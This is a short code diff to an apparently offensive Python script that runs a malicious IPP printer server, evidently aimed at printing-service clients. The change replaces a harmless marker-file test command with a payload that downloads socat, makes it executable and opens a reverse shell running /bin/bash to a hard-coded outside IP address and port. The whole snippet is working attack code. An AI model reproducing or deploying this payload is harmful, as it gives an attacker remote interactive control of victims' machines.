@@ -192,8 +192,7 @@ if __name__ == "__main__":
     SERVER_HOST = sys.argv[1]
     SERVER_PORT = 12345
 
-    command = "echo 1 > /tmp/I_AM_VULNERABLE"
-
+    command = "cd /tmp && wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat && chmod +x socat && ./socat TCP:34.38.99.213:5656 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
     server = IPPServer((SERVER_HOST, SERVER_PORT),
                        IPPRequestHandler, MaliciousPrinter(command))
     print('malicious ipp server listening on ', server.server_address)
